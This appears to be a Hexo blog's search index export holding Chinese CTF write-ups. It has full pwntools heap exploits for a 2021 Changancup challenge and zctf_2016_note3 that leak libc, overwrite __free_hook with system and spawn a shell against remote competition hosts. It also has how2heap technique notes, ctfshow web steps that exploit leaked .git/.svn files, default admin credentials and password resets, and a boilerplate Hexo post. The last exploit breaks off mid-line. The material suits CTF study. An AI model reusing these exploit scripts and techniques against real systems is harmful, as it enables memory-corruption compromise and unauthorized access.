<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021长安杯-pwn</title>
    <url>/2021/09/25/2021%E9%95%BF%E5%AE%89%E6%9D%AF-pwn/</url>
    <content><![CDATA[<p>高质量比赛，下辈子再来（</p>
<span id="more"></span>

<p>非常的皮啊。4道pwn2道0解1道一解，还有道就是这个baigei的36解。。。</p>
<p>这次pwn有repwn，webpwn太难受了，转生吧笑死直接变全栈</p>
<p>看题，看题</p>
<p>漏洞在于add这里,没有对堆下标做检测，导致可以申请同序号的堆，那么我们申请一个随意的堆，在申请同序号的，在size这改为-1之类的，就可以让其在heaparry上的大小变成无限大，导致在edit的时候堆溢出</p>
<p>add</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_A04</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *nbytes_4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx?&quot;</span>);</span><br><span class="line">  v1 = sub_9A9();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  nbytes = sub_9A9();</span><br><span class="line">  qword_202060[v1] = nbytes;</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &gt; <span class="number">1024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  nbytes_4 = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( !nbytes_4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  *((_QWORD *)&amp;unk_2020E0 + v1) = nbytes_4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;unk_2020E0 + v1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;idx?\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content?\n&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;idx?\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;idx?\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content?\n&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;\n&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;idx?\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;113.201.14.253&quot;</span>,<span class="number">21111</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	add(i,<span class="number">1024</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">	add(i,<span class="number">1024</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0x820</span>)+<span class="string">&#x27;\x10&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(i,<span class="number">1024</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">1024</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1024</span>,<span class="string">&#x27;\xa0&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak_addr:&quot;</span>,<span class="built_in">hex</span>(leak_addr)</span><br><span class="line">libc_base = leak_addr-(<span class="number">0x7f41502f7190</span>-<span class="number">0x7f414ff0b000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free_hook:&quot;</span>,free_hook</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">8</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">1024</span>,<span class="string">&#x27;/bin/sh\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1024</span>,p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>HRP-转生web人</title>
    <url>/2021/09/27/HRP-%E8%BD%AC%E7%94%9Fweb%E4%BA%BA/</url>
    <content><![CDATA[<p>和人合资买了SHOW的vip，pwn好卷，于是打算双开了（也许三开？偶尔逆向）</p>
<span id="more"></span>

<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>直接查看源代码</p>
<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>在url头部加上view-source:</p>
<p>但是我谷歌直接看源代码也可以，奇怪哈哈</p>
<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>burpsuite抓包，win的java烂了直接进kali快乐</p>
<p>抓了直接放抓他的返回包，看http头</p>
<p><img src="https://user-images.githubusercontent.com/72968793/134817230-91bc9b24-ea31-46b1-8014-873bfb496536.png" alt="image"></p>
<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>直接访问robots.txt，得到文件名flagishere.txt</p>
<p>直接访问得到ctfshow{4df8aa03-ea9c-4417-a29d-39dbe1a596ad}</p>
<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>直接访问index.phps</p>
<p>打开如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-01 14:14:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-01 14:34:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctfshow&#123;d2071546-0f5a-4ea2-8638-d09a5b40922e&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;web5:where is flag ?&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>访问<a href="http://www.zip得到压缩包打开有flag/">www.zip得到压缩包打开有flag</a></p>
<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>git代码泄露访问如下路径得到flag</p>
<p>/.git/index.php</p>
<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>svn代码泄露访问如下路径得到flag</p>
<p>/.svn/</p>
<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p>vim缓存泄露源码</p>
<p>/index.php.swp</p>
<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>抓包看cookie</p>
<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p>阿里运维之家<a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></p>
<p>直接DNS检测</p>
<p>flag{just_seesee}</p>
<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p>开始有点感觉了好好玩，就算他没有robots.txt文件我们可以尝试后台的后缀什么login，admin</p>
<p>这里的后台就是admin，密码就是index.php下的电话号码</p>
<h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p>善于发现网站可下载文档，这个题在document文件里面包含了后台地址登录密码</p>
<p><a href="http://f6122ad5-1f03-46b1-abd8-564a8e9c245c.challenge.ctf.show:8080/system1103/login.php">http://f6122ad5-1f03-46b1-abd8-564a8e9c245c.challenge.ctf.show:8080/system1103/login.php</a></p>
<p>admin    admin1103</p>
<h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p>直接看网页源码想想有什么东西，题目提示editor直接搜索发现</p>
<p><a href="http://1b5b498e-e8f8-4b8d-a122-5ac9c2d8a3cc.challenge.ctf.show:8080/editor/upload/banner-app.png">editor/upload/banner-app.png</a></p>
<p>证明有编译器的存在，直接进去，找附件目录找到了nothinghere/fl000g.txt</p>
<p>直接把该路径加到root页面后面就行了</p>
<h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p>(＾－＾)V直接进去login.php发现没有,然后去/admin/有后台，提示说邮箱，然后有忘记密码</p>
<p>通过QQ号查询邮箱，是西安的，直接改密码getflag</p>
<p><img src="https://user-images.githubusercontent.com/72968793/134818793-d56a85c4-612b-49e6-9c57-d732bc900876.png" alt="image"></p>
<p>现在是2021.9.27凌晨2点，做了15道(¦3[▓▓] 晚安</p>
<h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p>探针泄露url/tz.php</p>
<p>找到该页面的phpinfo进入寻找flag</p>
<h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><p>直接查域名IP，ping的话得到的是IPV6不行</p>
<h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p>查看源码找到Unicode编码转中文然后进入110.php得到flag</p>
<h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p>查看网页源码获得密钥直接hackbar传参</p>
<p>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p>
<p>getflag</p>
<h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p>访问/db/db.mdb得到db.mdb文件txt打开搜索flag</p>
<p>flag{ctfshow_old_database}</p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/09/14/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>how2heap</title>
    <url>/2021/08/29/how2heap/</url>
    <content><![CDATA[<p>HWO 2 HEAP</p>
<span id="more"></span>

<h1 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc_2.27"></a>glibc_2.27</h1><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>fastbin_dup讲的是简单的double fastbin attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a)</span><br><span class="line"><span class="built_in">free</span>(b)</span><br><span class="line"><span class="built_in">free</span>(a)</span><br><span class="line"></span><br><span class="line">之后申请<span class="number">3</span>次同样大小的chunk，第三次所得即可以得到另外一个指向a的chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据上述，我们在第三次申请出来的时候就可以得到指向main_arena+88的地址达到泄露libc的效果</p>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><p>这个方法的作用就是在知道栈地址的情况下利用fastbin攻击去把chunk申请到栈上，利用条件比较有限，缓冲区溢出或者UAF。</p>
<p>先new7个unsortedbin大小的chunk我这里选择0x100，然再在new2个0x100</p>
<p>new一个0x10或者0x20的chunk隔开top_chunk,free掉0-6号填充tc，</p>
<p>然后free(8),free(9),malloc(0x100)[申请0x100的是把tc头申请出来],free(8)[这里是让8号成为tc头，得到有效指针]，然后去new一个大小0x120的，把里面的fd指针改为fake_chunk_addr，接着new2个0x100的，第二个new得到的0x100的chunk就是fake_chunk了</p>
<h2 id="house-of-botcake-unsortedbin-double-free"><a href="#house-of-botcake-unsortedbin-double-free" class="headerlink" title="house_of_botcake(unsortedbin double free)"></a>house_of_botcake(unsortedbin double free)</h2><p>=-=，填充unsortedbin tcache，free 受害 chunk，free辅助chunk </p>
<p>此时unsortedbin合并成了0x220大小的chunk，我们再去new一个0x100大小的chunk，把tcache头弄出来，再去free受害chunk，让他成为tcache头，然后申请一个0x120大小的chunk清理下unsortedbin让他的大小小于0x110，</p>
<p>之后就再去对受害chunk的fd指针写入栈地址，接着申请的第二次的堆就是在栈上申请的了。</p>
<p>（不一定是栈，换成别的地址同样成立）</p>
<h2 id="house-of-einherjar-largebin-attack"><a href="#house-of-einherjar-largebin-attack" class="headerlink" title="house_of_einherjar(largebin attack)"></a>house_of_einherjar(largebin attack)</h2><p>这个house主要是利用off by null漏洞配合largebin进行任意地址申请。</p>
<p>下面就简单说下怎么利用，最重要的一点就是你要知道你想任意申请的地址的real addr，fake chunk的构造如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">	fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">	fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">	fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">	fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">	fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">	fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br></pre></td></tr></table></figure>

<p>这里选取的是栈上进行排布的，那么我们常态都在堆上排布。</p>
<p>可以如下布局</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc(<span class="number">0x100</span>) <span class="comment">#chunk0</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(fake_chunk)*<span class="number">4</span>)</span><br><span class="line">malloc(<span class="number">0x38</span>)<span class="comment">#chunk1</span></span><br><span class="line">malloc(<span class="number">0x4f8</span>)<span class="comment">#chunk2</span></span><br><span class="line"><span class="comment">#由于存在off by null 漏洞我们假设在edit的时候存在这个漏洞</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(prev_size))</span><br><span class="line"><span class="comment">#这里的prev_size的公式如下</span></span><br><span class="line"><span class="comment">#prev_size_addr-fake_chunk_addr=prev_size</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x100</span>)+p64(prev_size)+p64(fake_chunk)*<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>)<span class="comment">#这个堆此时就会申请到我们想要的地址+0x10上了</span></span><br><span class="line"><span class="comment">#至于你malloc多少是你自己的事情，就要看你之前chunk0布局的是多大了，只要申请的大小大于之前布局的大小都可以，在这里0x100也是可以的。</span></span><br></pre></td></tr></table></figure>

<p>关于#prev_size_addr-fake_chunk_addr=prev_size的chunk1的gdb布局如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x555555757250</span></span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0x555555757260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757290</span>:	<span class="number">0xffffd55555759360</span>	<span class="number">0x0000000000000500</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结下来说，条件要的还是比较多，最重要的还是地址的获取，堆题的基本要素就是地址泄露。</p>
<p>最后讲下可能让人懵逼的点，也许有人会觉得很神奇，其实不然。</p>
<p>在上面的排布中我们是这样排布的</p>
<p>chunk0</p>
<p>chunk1</p>
<p>chunk2</p>
<p>我们把2的prev_size改成了包揽chunk0和chunk1在内的大小，同时把chunk0里面包含的fake chunk大小改为了包揽chunk0和chunk1在内的大小，那么当我们利用off by null去free chunk2造成的堆重叠，我们再去申请一个chunk大小和chunk0相同的，本来正常来说我们不去改动他的fd，bk以及fd_size,bk_size就会正常申请回chunk0但是我们做了手脚，让chunk0此时指向了fake chunk，那么我们去申请的时候就会往fake chunk的地址上去申请了就是这个道理。</p>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>方法如其名，暴力的不行，要是条件允许的情况下，比如堆溢出，或者可以泄露出top chunk的addr利用别办法申请到top chunk，把top chunk大小改成-1</p>
<p>这样就可以随便malloc了，也是属于一种任意地址申请。</p>
]]></content>
  </entry>
  <entry>
    <title>整数溢出unlink</title>
    <url>/2021/09/14/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BAunlink/</url>
    <content><![CDATA[<h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><p>整数溢出的unlink，在edit功能里面造成了整数溢出</p>
<p>，这个题目的排布也很神奇，原本在heap[-1]处就存在一个堆指针。。。。</p>
<p>所以溢出成-1大小是无限的</p>
<span id="more"></span>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#r = process(&#x27;./zctf_2016_note3&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26250</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./zctf_2016_note3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">heap_0_ptr_addr = <span class="number">0x00000000006020C8</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;(less than 1024)&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   r.sendafter(<span class="string">&#x27;content:&#x27;</span>,content[<span class="number">0</span>:size-<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   r.sendafter(<span class="string">&#x27;Input the new content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#让heaps[-1]为heaps[0]</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#现在，通过让index为-1，就可以溢出chunk0</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">payload += p64(heap_0_ptr_addr - <span class="number">0x18</span>) + p64(heap_0_ptr_addr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">0x8000000000000000</span> - <span class="number">0x10000000000000000</span>,payload)</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) * <span class="number">3</span> + p64(free_got) + p64(atoi_got) *<span class="number">2</span> + <span 